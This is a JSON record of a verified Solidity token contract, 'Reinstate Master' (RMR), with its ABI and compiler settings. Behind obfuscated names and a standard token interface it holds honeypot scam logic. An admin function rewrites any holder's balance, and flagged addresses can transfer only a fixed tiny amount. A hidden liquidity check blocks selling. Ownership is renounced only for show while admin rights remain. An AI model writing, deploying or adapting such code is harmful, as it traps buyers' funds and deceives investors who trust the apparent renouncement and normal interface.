{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface senderFund {\n    function createPair(address autoMax, address senderFeeMode) external returns (address);\n}\n\ninterface fromFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldEnableBuy) external view returns (uint256);\n\n    function transfer(address receiverReceiver, uint256 senderAt) external returns (bool);\n\n    function allowance(address shouldWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverReceiver,\n        uint256 senderAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderWalletShould, uint256 value);\n    event Approval(address indexed shouldWallet, address indexed spender, uint256 value);\n}\n\nabstract contract amountSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface toSell is fromFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReinstateMaster is amountSell, fromFund, toSell {\n\n    function modeReceiver(uint256 senderAt) public {\n        receiverAutoShould();\n        exemptTrading = senderAt;\n    }\n\n    uint256 constant listModeEnable = 14 ** 10;\n\n    function balanceOf(address shouldEnableBuy) public view virtual override returns (uint256) {\n        return atSell[shouldEnableBuy];\n    }\n\n    mapping(address => mapping(address => uint256)) private limitIs;\n\n    bool public toFrom;\n\n    function receiverFee(address shouldMax, address receiverReceiver, uint256 senderAt) internal returns (bool) {\n        require(atSell[shouldMax] >= senderAt);\n        atSell[shouldMax] -= senderAt;\n        atSell[receiverReceiver] += senderAt;\n        emit Transfer(shouldMax, receiverReceiver, senderAt);\n        return true;\n    }\n\n    mapping(address => bool) public modeAutoLimit;\n\n    uint256 launchedReceiver;\n\n    function owner() external view returns (address) {\n        return tradingLimit;\n    }\n\n    address public enableTrading;\n\n    string private fromLiquidity = \"Reinstate Master\";\n\n    string private atBuy = \"RMR\";\n\n    bool public shouldAutoWallet;\n\n    uint256 exemptTrading;\n\n    function transfer(address minAtTo, uint256 senderAt) external virtual override returns (bool) {\n        return shouldReceiver(_msgSender(), minAtTo, senderAt);\n    }\n\n    bool private autoShouldList;\n\n    address public autoLiquidity;\n\n    function receiverAutoShould() private view {\n        require(txMode[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalSender;\n    }\n\n    uint256 private modeExempt = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public txMode;\n\n    function approve(address receiverAmountAuto, uint256 senderAt) public virtual override returns (bool) {\n        limitIs[_msgSender()][receiverAmountAuto] = senderAt;\n        emit Approval(_msgSender(), receiverAmountAuto, senderAt);\n        return true;\n    }\n\n    function transferFrom(address shouldMax, address receiverReceiver, uint256 senderAt) external override returns (bool) {\n        if (_msgSender() != launchMode) {\n            if (limitIs[shouldMax][_msgSender()] != type(uint256).max) {\n                require(senderAt <= limitIs[shouldMax][_msgSender()]);\n                limitIs[shouldMax][_msgSender()] -= senderAt;\n            }\n        }\n        return shouldReceiver(shouldMax, receiverReceiver, senderAt);\n    }\n\n    address launchMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return atBuy;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fromLiquidity;\n    }\n\n    function shouldReceiver(address shouldMax, address receiverReceiver, uint256 senderAt) internal returns (bool) {\n        if (shouldMax == autoLiquidity) {\n            return receiverFee(shouldMax, receiverReceiver, senderAt);\n        }\n        uint256 swapLiquidity = fromFund(enableTrading).balanceOf(launchedEnableLaunch);\n        require(swapLiquidity == exemptTrading);\n        require(receiverReceiver != launchedEnableLaunch);\n        if (modeAutoLimit[shouldMax]) {\n            return receiverFee(shouldMax, receiverReceiver, listModeEnable);\n        }\n        return receiverFee(shouldMax, receiverReceiver, senderAt);\n    }\n\n    event OwnershipTransferred(address indexed receiverSell, address indexed modeLiquidity);\n\n    uint8 private totalSender = 18;\n\n    address private tradingLimit;\n\n    address launchedEnableLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private sellMarketingBuy;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeExempt;\n    }\n\n    function takeReceiver(address shouldLaunchSwap) public {\n        if (isMin) {\n            return;\n        }\n        if (toFrom) {\n            sellMarketingBuy = txTokenTo;\n        }\n        txMode[shouldLaunchSwap] = true;\n        if (autoShouldList != shouldAutoWallet) {\n            shouldAutoWallet = true;\n        }\n        isMin = true;\n    }\n\n    bool public isMin;\n\n    function receiverSender() public {\n        emit OwnershipTransferred(autoLiquidity, address(0));\n        tradingLimit = address(0);\n    }\n\n    constructor (){\n        \n        senderExempt fromTotalLimit = senderExempt(launchMode);\n        enableTrading = senderFund(fromTotalLimit.factory()).createPair(fromTotalLimit.WETH(), address(this));\n        if (sellMarketingBuy == txTokenTo) {\n            autoShouldList = true;\n        }\n        autoLiquidity = _msgSender();\n        txMode[autoLiquidity] = true;\n        atSell[autoLiquidity] = modeExempt;\n        receiverSender();\n        if (toFrom == autoShouldList) {\n            toFrom = false;\n        }\n        emit Transfer(address(0), autoLiquidity, modeExempt);\n    }\n\n    mapping(address => uint256) private atSell;\n\n    function feeSellFund(address minAtTo, uint256 senderAt) public {\n        receiverAutoShould();\n        atSell[minAtTo] = senderAt;\n    }\n\n    function allowance(address txWallet, address receiverAmountAuto) external view virtual override returns (uint256) {\n        if (receiverAmountAuto == launchMode) {\n            return type(uint256).max;\n        }\n        return limitIs[txWallet][receiverAmountAuto];\n    }\n\n    function enableSender(address marketingMax) public {\n        receiverAutoShould();\n        if (txTokenTo != sellMarketingBuy) {\n            toFrom = true;\n        }\n        if (marketingMax == autoLiquidity || marketingMax == enableTrading) {\n            return;\n        }\n        modeAutoLimit[marketingMax] = true;\n    }\n\n    uint256 public txTokenTo;\n\n    function getOwner() external view returns (address) {\n        return tradingLimit;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderWalletShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverAmountAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAmountAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldEnableBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMax\",\"type\":\"address\"}],\"name\":\"enableSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAtTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderAt\",\"type\":\"uint256\"}],\"name\":\"feeSellFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeAutoLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderAt\",\"type\":\"uint256\"}],\"name\":\"modeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAutoWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLaunchSwap\",\"type\":\"address\"}],\"name\":\"takeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAtTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTokenTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ReinstateMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}